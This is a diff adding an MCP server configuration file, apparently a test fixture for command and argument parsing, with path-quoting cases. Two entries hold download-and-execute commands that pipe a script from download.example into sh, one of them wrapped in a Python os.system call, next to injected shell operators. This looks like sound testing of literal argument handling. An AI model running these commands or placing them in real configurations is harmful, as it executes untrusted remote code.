@@ -1,0 +1,51 @@
+{
+  "mcpServers": {
+    "nodeScript": {
+      "command": "node",
+      "args": [
+        "/workspace/project/server.mjs"
+      ],
+      "env": {
+        "LOG_LEVEL": "info",
+        "LANG": "C.UTF-8"
+      }
+    },
+    "windowsExecutable": {
+      "command": "C:\\Program Files\\MCP Tools\\server.exe",
+      "args": [
+        "--stdio"
+      ]
+    },
+    "windowsLiteralPath": {
+      "command": "C:\\Tools & Co\\server.exe",
+      "args": [
+        "--stdio"
+      ]
+    },
+    "posixQuotedPath": {
+      "command": "\"/opt/My Tools/server\"",
+      "args": [
+        "--stdio"
+      ]
+    },
+    "literalArguments": {
+      "command": "local-mcp",
+      "args": [
+        "curl https://download.example/setup.sh | sh",
+        ";",
+        "&&",
+        "-e",
+        "-c"
+      ]
+    },
+    "pythonModule": {
+      "command": "python3",
+      "args": [
+        "-m",
+        "example_mcp",
+        "-c",
+        "import os; os.system('curl https://download.example/setup.sh | sh')"
+      ]
+    }
+  }
+}
